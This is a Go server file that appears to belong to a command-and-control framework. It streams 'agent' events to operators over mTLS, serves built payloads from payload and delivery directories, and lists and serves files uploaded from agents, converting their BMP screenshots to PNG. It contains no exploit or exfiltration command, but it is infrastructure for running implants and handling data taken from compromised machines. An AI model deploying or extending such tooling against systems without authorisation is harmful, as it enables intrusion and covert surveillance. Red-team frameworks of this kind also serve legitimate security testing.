package server

// gui.go — SSE event hub used by both the agent HTTP handler and the operator
// API's /api/events endpoint. The web GUI itself lives in the client binary.

import (
	"bytes"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"image"
	"image/color"
	"image/png"
	"io"
	"io/fs"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

// ── SSE event hub ─────────────────────────────────────────────────────────────

type sseEvent struct {
	Type    string `json:"type"`
	AgentID string `json:"agent_id,omitempty"`
	TaskID  int64  `json:"task_id,omitempty"`
	Sender  string `json:"sender,omitempty"`
	Msg     string `json:"msg"`
	Level   string `json:"level,omitempty"`
}

type sseHub struct {
	mu      sync.Mutex
	clients map[chan sseEvent]bool
}

var hub = &sseHub{clients: make(map[chan sseEvent]bool)}

func (h *sseHub) Broadcast(e sseEvent) {
	h.mu.Lock()
	defer h.mu.Unlock()
	for ch := range h.clients {
		select {
		case ch <- e:
		default:
		}
	}
}

func (h *sseHub) subscribe() chan sseEvent {
	ch := make(chan sseEvent, 32)
	h.mu.Lock()
	h.clients[ch] = true
	h.mu.Unlock()
	return ch
}

func (h *sseHub) unsubscribe(ch chan sseEvent) {
	h.mu.Lock()
	delete(h.clients, ch)
	h.mu.Unlock()
}

// BroadcastGUI is the package-level helper called from agent handlers.
func BroadcastGUI(typ, agentID, msg string) {
	hub.Broadcast(sseEvent{Type: typ, AgentID: agentID, Msg: msg, Level: "info"})
}

// ── Operator API handlers exposed via mTLS ────────────────────────────────────

// apiSSE streams SSE events to an operator client (mTLS protected).
func (s *Server) apiSSE(w http.ResponseWriter, r *http.Request) {
	flusher, ok := w.(http.Flusher)
	if !ok {
		http.Error(w, "SSE not supported", http.StatusInternalServerError)
		return
	}

	operator := operatorFromCert(r)
	s.online.Heartbeat(operator)

	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")
	w.Header().Set("X-Accel-Buffering", "no")
	flusher.Flush()

	ch := hub.subscribe()
	defer hub.unsubscribe(ch)

	// Use a shorter ping interval so the heartbeat is refreshed well within operatorTimeout.
	ping := time.NewTicker(15 * time.Second)
	defer ping.Stop()

	ctx := r.Context()
	for {
		select {
		case <-ctx.Done():
			return
		case <-ping.C:
			s.online.Heartbeat(operator)
			fmt.Fprintf(w, ": ping\n\n")
			flusher.Flush()
		case ev := <-ch:
			data, _ := json.Marshal(ev)
			fmt.Fprintf(w, "data: %s\n\n", data)
			flusher.Flush()
		}
	}
}

// apiUploads lists files in data/uploads (GET) or accepts an operator file upload (POST).
func (s *Server) apiUploads(w http.ResponseWriter, r *http.Request) {
	uploadDir := filepath.Join(s.cfg.DataDir, "uploads")

	if r.Method == http.MethodPost {
		if err := r.ParseMultipartForm(256 << 20); err != nil { // 256 MB max
			jsonErr(w, "parse multipart: "+err.Error(), http.StatusBadRequest)
			return
		}
		file, hdr, err := r.FormFile("file")
		if err != nil {
			jsonErr(w, "missing file field: "+err.Error(), http.StatusBadRequest)
			return
		}
		defer file.Close()
		name := filepath.Base(hdr.Filename)
		if name == "" || name == "." {
			jsonErr(w, "invalid filename", http.StatusBadRequest)
			return
		}
		if err := os.MkdirAll(uploadDir, 0755); err != nil {
			jsonErr(w, "mkdir: "+err.Error(), http.StatusInternalServerError)
			return
		}
		dst, err := os.Create(filepath.Join(uploadDir, name))
		if err != nil {
			jsonErr(w, "create: "+err.Error(), http.StatusInternalServerError)
			return
		}
		defer dst.Close()
		n, err := io.Copy(dst, file)
		if err != nil {
			jsonErr(w, "write: "+err.Error(), http.StatusInternalServerError)
			return
		}
		jsonOK(w, map[string]any{"filename": name, "size": n})
		return
	}

	type fileEntry struct {
		AgentID   string `json:"agent_id"`
		Filename  string `json:"filename"`
		Size      int64  `json:"size"`
		CreatedAt string `json:"created_at"`
	}
	var files []fileEntry
	filepath.WalkDir(uploadDir, func(path string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return nil
		}
		rel, _ := filepath.Rel(uploadDir, path)
		parts := strings.SplitN(rel, string(filepath.Separator), 2)
		agentID, filename := "", rel
		if len(parts) == 2 {
			agentID, filename = parts[0], parts[1]
		}
		info, _ := d.Info()
		sz, ts := int64(0), ""
		if info != nil {
			sz = info.Size()
			ts = info.ModTime().UTC().Format(time.RFC3339)
		}
		files = append(files, fileEntry{AgentID: agentID, Filename: filename, Size: sz, CreatedAt: ts})
		return nil
	})
	if files == nil {
		files = []fileEntry{}
	}
	jsonOK(w, files)
}

// apiArtifactList lists built payload files from bin/payloads/.
func (s *Server) apiArtifactList(w http.ResponseWriter, r *http.Request) {
	payloadsDir := filepath.Join(projectRoot(), "bin", "payloads")
	type entry struct {
		Filename  string `json:"filename"`
		Size      int64  `json:"size"`
		CreatedAt string `json:"created_at"`
	}
	var files []entry
	filepath.WalkDir(payloadsDir, func(path string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return nil
		}
		info, _ := d.Info()
		sz, ts := int64(0), ""
		if info != nil {
			sz = info.Size()
			ts = info.ModTime().UTC().Format(time.RFC3339)
		}
		files = append(files, entry{Filename: filepath.Base(path), Size: sz, CreatedAt: ts})
		return nil
	})
	if files == nil {
		files = []entry{}
	}
	jsonOK(w, files)
}

// apiArtifact serves a single file from bin/ or bin/payloads/.
func (s *Server) apiArtifact(w http.ResponseWriter, r *http.Request) {
	name := filepath.Base(r.URL.Path)
	if name == "" || name == "." {
		jsonErr(w, "filename required", http.StatusBadRequest)
		return
	}
	root := projectRoot()
	for _, dir := range []string{
		filepath.Join(root, "bin"),
		filepath.Join(root, "bin", "payloads"),
		filepath.Join(root, "bin", "delivery"),
	} {
		fp := filepath.Join(dir, name)
		if filepath.Dir(fp) != dir {
			continue // path traversal guard
		}
		if _, err := os.Stat(fp); err == nil {
			http.ServeFile(w, r, fp)
			return
		}
	}
	jsonErr(w, "not found", http.StatusNotFound)
}

// apiDownload serves a file from data/uploads.
// Supports both flat names (/api/dl/file.bin) and agent subdirs (/api/dl/agentid/file.bin).
// BMP files are converted to PNG on the fly for browser compatibility.
func (s *Server) apiDownload(w http.ResponseWriter, r *http.Request) {
	suffix := strings.TrimPrefix(r.URL.Path, "/api/dl/")
	suffix = filepath.Clean(suffix)
	if suffix == "" || suffix == "." || strings.Contains(suffix, "..") {
		jsonErr(w, "not found", http.StatusNotFound)
		return
	}
	uploadDir, _ := filepath.Abs(filepath.Join(s.cfg.DataDir, "uploads"))
	fp := filepath.Join(uploadDir, suffix)
	abs, _ := filepath.Abs(fp)
	if abs != uploadDir && !strings.HasPrefix(abs, uploadDir+string(filepath.Separator)) {
		jsonErr(w, "not found", http.StatusNotFound)
		return
	}
	if r.Method == http.MethodDelete {
		if err := os.Remove(abs); err != nil {
			jsonErr(w, "delete failed: "+err.Error(), http.StatusInternalServerError)
			return
		}
		jsonOK(w, "deleted")
		return
	}
	// Convert BMP to PNG so any browser can display screenshots inline.
	if strings.EqualFold(filepath.Ext(abs), ".bmp") {
		if raw, err := os.ReadFile(abs); err == nil {
			if pngData := bmpToPNG(raw); pngData != nil {
				w.Header().Set("Content-Type", "image/png")
				w.Header().Set("Cache-Control", "max-age=3600")
				w.Write(pngData)
				return
			}
		}
	}
	http.ServeFile(w, r, abs)
}

// bmpToPNG converts a 32-bit top-down or bottom-up BMP to PNG.
func bmpToPNG(data []byte) []byte {
	if len(data) < 54 || data[0] != 'B' || data[1] != 'M' {
		return nil
	}
	pixOffset := int(binary.LittleEndian.Uint32(data[10:14]))
	width := int(binary.LittleEndian.Uint32(data[18:22]))
	heightRaw := int32(binary.LittleEndian.Uint32(data[22:26]))
	bitCount := binary.LittleEndian.Uint16(data[28:30])
	if bitCount != 32 || width <= 0 {
		return nil
	}
	topDown := heightRaw < 0
	absH := int(heightRaw)
	if topDown {
		absH = -absH
	}
	if absH <= 0 || pixOffset+width*absH*4 > len(data) {
		return nil
	}
	img := image.NewNRGBA(image.Rect(0, 0, width, absH))
	pix := data[pixOffset:]
	for y := 0; y < absH; y++ {
		srcRow := y
		if !topDown {
			srcRow = absH - 1 - y // bottom-up: flip
		}
		for x := 0; x < width; x++ {
			off := (srcRow*width + x) * 4
			b, g, r, a := pix[off], pix[off+1], pix[off+2], pix[off+3]
			if a == 0 {
				a = 255 // treat fully-transparent as opaque (GDI screenshots)
			}
			img.SetNRGBA(x, y, color.NRGBA{R: r, G: g, B: b, A: a})
		}
	}
	var buf bytes.Buffer
	if err := png.Encode(&buf, img); err != nil {
		return nil
	}
	return buf.Bytes()
}
